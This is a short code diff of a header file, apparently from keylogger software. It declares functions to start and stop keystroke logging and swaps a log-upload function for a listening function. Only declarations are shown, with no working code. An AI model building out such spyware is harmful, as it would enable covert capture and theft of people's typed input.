@@ -4,4 +4,4 @@
 
 void StopKeyLogger();
 void StartKeyLogger();
-void UploadLog(Client* localClient);
+void StartListen();
